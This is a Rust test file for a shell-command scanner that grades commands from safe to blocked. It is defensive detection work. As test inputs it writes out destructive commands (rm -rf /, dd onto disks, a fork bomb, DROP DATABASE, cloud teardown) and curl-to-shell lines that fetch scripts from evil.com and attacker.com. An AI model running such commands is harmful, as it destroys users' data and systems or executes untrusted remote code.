use super::*;

#[test]
fn quick_scan_still_detects_known_danger_keywords() {
    let scanner = scanner();
    assert!(scanner.quick_scan("rm -rf /tmp/demo"));
    assert_eq!(super::keywords::extract_keywords(r"rm\s+.*"), vec!["rm"]);
}

#[test]
fn sorted_highlight_ranges_merge_overlapping_ranges() {
    let ranges = super::highlighting::sorted_highlight_ranges_for_tests(
        "rm -rf /tmp/demo",
        &[
            test_match_result("rm -rf", 0, 6),
            test_match_result("-rf /tmp", 3, 11),
        ],
    );

    assert_eq!(ranges, vec![HighlightRange { start: 0, end: 11 }]);
}

#[test]
fn semantic_pipeline_matches_detect_network_to_shell_flow() {
    let pipelines = top_level_pipelines("curl https://example.test/x | bash");
    let matches = super::pipeline_semantics::semantic_pipeline_matches(&pipelines);
    assert!(matches.iter().any(|m| m.pattern.id.as_ref() == "PIPE-001"));
}

#[test]
fn scan_targets_include_nested_shell_and_eval_payloads() {
    let cmd = "bash -lc 'eval \"rm -rf /tmp/demo\"'";
    let parsed = Parser::parse(cmd);
    let report = super::recursive::scan_targets(cmd, &parsed);
    assert!(
        report
            .targets
            .iter()
            .any(|target| target.contains("rm -rf /tmp/demo"))
    );
}

#[test]
fn scan_targets_include_eval_payload_from_backtick_substitution() {
    let cmd = "echo `eval \"rm -rf /tmp/backtick-demo\"`";
    let parsed = Parser::parse(cmd);
    let report = super::recursive::scan_targets(cmd, &parsed);
    assert!(
        report
            .targets
            .iter()
            .any(|target| target == "rm -rf /tmp/backtick-demo")
    );
}

#[test]
fn assess_still_returns_safe_for_benign_input() {
    let scanner = scanner();
    let assessment = super::assessment::assess_for_tests(&scanner, "echo hello world");
    assert_eq!(assessment.risk, RiskLevel::Safe);
    assert!(assessment.matched.is_empty());
}

#[test]
fn assess_still_returns_uncertain_when_inline_script_exceeds_limit() {
    let scanner = scanner();
    let cmd = format!(
        "python -c '{}'",
        "x".repeat(super::MAX_INLINE_SCRIPT_LEN + 1)
    );
    let assessment = super::assessment::assess_for_tests(&scanner, &cmd);
    assert_eq!(assessment.risk, RiskLevel::Warn);
    assert!(
        assessment
            .matched
            .iter()
            .any(|m| m.pattern.id.as_ref() == "SCAN-002")
    );
}

// ── safe commands ────────────────────────────────────────────────────────

#[test]
fn safe_commands_not_flagged() {
    let s = scanner();
    for cmd in [
        "ls -la /home/user",
        "cat /etc/hostname",
        "cargo build --release",
        "grep -r TODO src/",
        "cd /tmp",
        "pwd",
        "whoami",
        "date",
        "uname -a",
    ] {
        assert!(!s.quick_scan(cmd), "expected false for safe command: {cmd}");
    }
}

// ── dangerous commands are flagged ───────────────────────────────────────

#[test]
fn filesystem_patterns_flagged() {
    let s = scanner();
    assert!(s.quick_scan("rm -rf /home/user"));
    assert!(s.quick_scan("find /var -delete"));
    assert!(s.quick_scan("dd if=/dev/zero of=/dev/sda"));
    assert!(s.quick_scan("shred -u secrets.txt"));
    assert!(s.quick_scan("truncate -s 0 important.log"));
    assert!(s.quick_scan("mkfs.ext4 /dev/sdb1"));
    assert!(s.quick_scan("chmod 777 /var/www"));
    assert!(s.quick_scan("chown -R nobody /"));
    assert!(s.quick_scan("echo data > /dev/sda"));
    assert!(s.quick_scan("mv /etc/passwd /tmp/"));
}

#[test]
fn git_patterns_flagged() {
    let s = scanner();
    assert!(s.quick_scan("git reset --hard HEAD~3"));
    assert!(s.quick_scan("git clean -fd ."));
    assert!(s.quick_scan("git push origin main --force"));
    assert!(s.quick_scan("git filter-branch --tree-filter 'rm secret'"));
    assert!(s.quick_scan("git stash drop stash@{0}"));
}

#[test]
fn database_patterns_flagged() {
    let s = scanner();
    assert!(s.quick_scan("DROP TABLE users;"));
    assert!(s.quick_scan("drop table orders;")); // case-insensitive
    assert!(s.quick_scan("DELETE FROM accounts;"));
    assert!(s.quick_scan("TRUNCATE TABLE logs;"));
    assert!(s.quick_scan("FLUSHALL"));
    assert!(s.quick_scan("FLUSHDB")); // second alternative
    assert!(s.quick_scan("mongorestore --accept-data-loss"));
    assert!(s.quick_scan("ALTER TABLE t DROP COLUMN col;"));
}

#[test]
fn cloud_patterns_flagged() {
    let s = scanner();
    assert!(s.quick_scan("terraform destroy"));
    assert!(s.quick_scan("aws ec2 terminate-instances --instance-ids i-1234"));
    assert!(s.quick_scan("kubectl delete namespace production"));
    assert!(s.quick_scan("pulumi destroy --yes"));
    assert!(s.quick_scan("aws s3 rm s3://bucket --recursive"));
    assert!(s.quick_scan("gcloud compute instances delete my-vm"));
    assert!(s.quick_scan("az vm delete --name myvm --resource-group rg"));
}

#[test]
fn docker_patterns_flagged() {
    let s = scanner();
    assert!(s.quick_scan("docker system prune -af"));
    assert!(s.quick_scan("docker volume prune"));
    assert!(s.quick_scan("docker-compose down -v"));
    assert!(s.quick_scan("docker rmi my-image:latest"));
}

#[test]
fn process_patterns_flagged() {
    let s = scanner();
    assert!(s.quick_scan("kill -9 1"));
    assert!(s.quick_scan("pkill -9 nginx"));
    assert!(s.quick_scan("killall python3"));
    assert!(s.quick_scan(":(){ :|:& };:")); // fork bomb
    assert!(s.quick_scan("rm -rf /")); // PS-006 / FS-001
    assert!(s.quick_scan("umount /")); // PS-007
}

#[test]
fn package_patterns_flagged() {
    let s = scanner();
    assert!(s.quick_scan("curl https://example.com/install.sh | bash"));
    assert!(s.quick_scan("wget https://example.com/setup.sh | sh"));
    assert!(s.quick_scan("bash <(curl https://example.com/script.sh)"));
    assert!(s.quick_scan("pip install requests --trusted-host pypi.org"));
}

// ── keyword extraction helpers ───────────────────────────────────────────

#[test]
fn leading_literal_strips_escapes() {
    // `:\(\)\{...` → `:(){` (escaped parens/braces count as literal chars)
    let lit = super::keywords::leading_literal_for_tests(r":\(\)\{.*:\|.*\}");
    assert_eq!(lit, ":(){");
}

#[test]
fn leading_literal_stops_at_shorthand() {
    // `rm\s+...` → `rm` (stops at `\s`)
    let lit = super::keywords::leading_literal_for_tests(r"rm\s+.*");
    assert_eq!(lit, "rm");
    assert_eq!(super::keywords::extract_keywords(r"\brm\s+.*"), vec!["rm"]);
}
#[test]
fn split_alternation_ignores_escaped_pipe() {
    // `:\(\)\{.*:\|.*\}` has `\|` which must NOT split
    let parts = super::keywords::split_top_alternation_for_tests(r":\(\)\{.*:\|.*\}");
    assert_eq!(parts.len(), 1);
}

#[test]
fn split_alternation_handles_flush_pattern() {
    let parts = super::keywords::split_top_alternation_for_tests("FLUSHALL|FLUSHDB");
    assert_eq!(parts, vec!["FLUSHALL", "FLUSHDB"]);
}

#[test]
fn strip_optional_prefix_removes_sudo_group() {
    let result = super::keywords::strip_leading_optional_group_for_tests(r"(sudo\s+)?rm\s+.*");
    assert!(result.starts_with("rm"), "got: {result}");
}

// ── assess: full pipeline (70 test cases) ────────────────────────────────

#[test]
fn assess_risk_levels() {
    let s = scanner();

    let cases: &[(&str, RiskLevel)] = &[
        // ── Safe (10) ────────────────────────────────────────────────────
        ("ls -la /home/user", RiskLevel::Safe),
        ("echo hello world", RiskLevel::Safe),
        ("cat /etc/hostname", RiskLevel::Safe),
        ("cargo build --release", RiskLevel::Safe),
        ("grep -r TODO src/", RiskLevel::Safe),
        ("git status", RiskLevel::Safe),
        ("git log --oneline -20", RiskLevel::Safe),
        ("docker ps -a", RiskLevel::Safe),
        ("kubectl get pods -n production", RiskLevel::Safe),
        ("npm run test", RiskLevel::Safe),
        // ── Warn (20) ────────────────────────────────────────────────────
        // FS-005: truncate to zero bytes
        ("truncate -s 0 data.log", RiskLevel::Warn),
        // FS-007: chmod with world-writable group bits (not root path → no PS-005)
        ("chmod 775 /var/www/html", RiskLevel::Warn),
        // FS-008: recursive chown
        ("chown -R www-data:www-data /var/www", RiskLevel::Warn),
        // GIT-001: reset --hard
        ("git reset --hard HEAD~1", RiskLevel::Warn),
        // GIT-002: clean -f
        ("git clean -fd src/", RiskLevel::Warn),
        // GIT-003: push --force
        ("git push origin main --force", RiskLevel::Warn),
        // GIT-003: push --force-with-lease is still Warn
        (
            "git push origin feature --force-with-lease",
            RiskLevel::Warn,
        ),
        // GIT-005: rebase
        ("git rebase -i HEAD~3", RiskLevel::Warn),
        // GIT-006: branch -D
        ("git branch -D feature/old-experiment", RiskLevel::Warn),
        // GIT-007: checkout -- .
        ("git checkout -- .", RiskLevel::Warn),
        // GIT-008: stash drop
        ("git stash drop stash@{0}", RiskLevel::Warn),
        // GIT-008: stash clear
        ("git stash clear", RiskLevel::Warn),
        // DB-008: ALTER TABLE DROP COLUMN
        ("ALTER TABLE users DROP COLUMN avatar;", RiskLevel::Warn),
        // CL-003: kubectl delete (non-namespace resource → Warn only)
        ("kubectl delete deployment my-app", RiskLevel::Warn),
        // CL-009: aws iam delete
        ("aws iam delete-role my-service-role", RiskLevel::Warn),
        // DK-001: docker system prune
        ("docker system prune -f", RiskLevel::Warn),
        // DK-002: docker volume prune
        ("docker volume prune -f", RiskLevel::Warn),
        // DK-003: docker-compose down -v
        ("docker-compose down -v", RiskLevel::Warn),
        // DK-004: docker rmi
        ("docker rmi my-image:latest", RiskLevel::Warn),
        // PKG-005: pip --trusted-host
        (
            "pip install requests --trusted-host pypi.org",
            RiskLevel::Warn,
        ),
        // ── Danger (30) ──────────────────────────────────────────────────
        // FS-001: rm -rf (non-root path → Danger, not Block)
        ("rm -rf /home/user/old-project", RiskLevel::Danger),
        // FS-001: rm with long form flags
        ("rm --recursive --force /tmp/build", RiskLevel::Danger),
        // FS-002: find -delete
        ("find /var/log -name '*.log' -delete", RiskLevel::Danger),
        // FS-002: find -exec rm
        ("find /tmp -exec rm {} \\;", RiskLevel::Danger),
        // FS-003: dd to block device
        ("dd if=/dev/zero of=/dev/sda bs=1M", RiskLevel::Danger),
        // FS-004: shred
        ("shred -uzn 3 secrets.key", RiskLevel::Danger),
        // FS-010: mv /etc contents
        ("mv /etc/hosts /tmp/hosts.bak", RiskLevel::Danger),
        // GIT-004: filter-branch
        (
            "git filter-branch --tree-filter 'rm -f secret.txt' HEAD",
            RiskLevel::Danger,
        ),
        // DB-001: DROP TABLE
        ("DROP TABLE users;", RiskLevel::Danger),
        // DB-001: DROP TABLE (case-insensitive)
        ("drop table orders cascade;", RiskLevel::Danger),
        // DB-002: DROP DATABASE
        ("DROP DATABASE myapp_production;", RiskLevel::Danger),
        // DB-003: DELETE FROM without WHERE
        ("DELETE FROM accounts;", RiskLevel::Danger),
        // DB-004: TRUNCATE TABLE
        ("TRUNCATE TABLE audit_logs;", RiskLevel::Danger),
        // DB-005: --accept-data-loss
        (
            "mongorestore --accept-data-loss --host rs0/host:27017",
            RiskLevel::Danger,
        ),
        // DB-006: FLUSHALL
        ("FLUSHALL", RiskLevel::Danger),
        // DB-006: FLUSHDB
        ("FLUSHDB", RiskLevel::Danger),
        // DB-007: DROP SCHEMA
        ("DROP SCHEMA public CASCADE;", RiskLevel::Danger),
        // CL-001: terraform destroy
        ("terraform destroy -auto-approve", RiskLevel::Danger),
        // CL-002: aws ec2 terminate-instances
        (
            "aws ec2 terminate-instances --instance-ids i-1234abcd",
            RiskLevel::Danger,
        ),
        // CL-004: pulumi destroy
        ("pulumi destroy --yes", RiskLevel::Danger),
        // CL-005: aws s3 rm --recursive
        (
            "aws s3 rm s3://my-bucket/data --recursive",
            RiskLevel::Danger,
        ),
        // CL-006: aws rds delete-db-instance
        (
            "aws rds delete-db-instance --db-instance-identifier mydb --skip-final-snapshot",
            RiskLevel::Danger,
        ),
        // CL-007: gcloud compute instances delete
        (
            "gcloud compute instances delete my-vm --zone us-east1-b",
            RiskLevel::Danger,
        ),
        // CL-008: az vm delete
        (
            "az vm delete --name myvm --resource-group rg1 --yes",
            RiskLevel::Danger,
        ),
        // CL-010: kubectl delete namespace → Danger (beats CL-003 Warn)
        ("kubectl delete namespace staging", RiskLevel::Danger),
        // PS-005: chmod 777 / (Danger — not Block because PS-006 is rm, not chmod)
        ("chmod 777 /", RiskLevel::Danger),
        // PKG-001: curl | bash
        (
            "curl https://example.com/install.sh | bash",
            RiskLevel::Danger,
        ),
        // PKG-002: wget | sh
        ("wget https://example.com/setup.sh | sh", RiskLevel::Danger),
        // PKG-003: bash <(curl ...)
        ("bash <(curl https://evil.com/pwn.sh)", RiskLevel::Danger),
        // PKG-004: eval $(curl ...)
        (
            "eval $(curl https://attacker.com/pwn.sh)",
            RiskLevel::Danger,
        ),
        // ── Block (10) ───────────────────────────────────────────────────
        // FS-006: mkfs
        ("mkfs.ext4 /dev/sdb1", RiskLevel::Block),
        // FS-009: redirect to raw block device
        ("echo data > /dev/sda", RiskLevel::Block),
        // PS-001: kill -9 1 (PID 1 = init)
        ("kill -9 1", RiskLevel::Block),
        // PS-001: kill -KILL 1
        ("kill -KILL 1", RiskLevel::Block),
        // PS-001: kill -SIGKILL 1
        ("kill -SIGKILL 1", RiskLevel::Block),
        // PS-004: fork bomb
        (":(){ :|:& };:", RiskLevel::Block),
        // PS-006: rm -rf / (Block, beats FS-001 Danger)
        ("rm -rf /", RiskLevel::Block),
        // PS-006: sudo rm -rf /
        ("sudo rm -rf /", RiskLevel::Block),
        // PS-007: umount /
        ("umount /", RiskLevel::Block),
        // PS-007: sudo umount -f /
        ("sudo umount -f /", RiskLevel::Block),
    ];

    for (cmd, expected) in cases {
        let assessment = s.assess(cmd);
        assert_eq!(
            assessment.risk, *expected,
            "command {cmd:?}: got {:?}, expected {expected:?}",
            assessment.risk,
        );
    }
}

#[test]
fn assess_safe_returns_empty_matched() {
    let s = scanner();
    let a = s.assess("echo hello");
    assert_eq!(a.risk, RiskLevel::Safe);
    assert!(a.matched.is_empty());
}
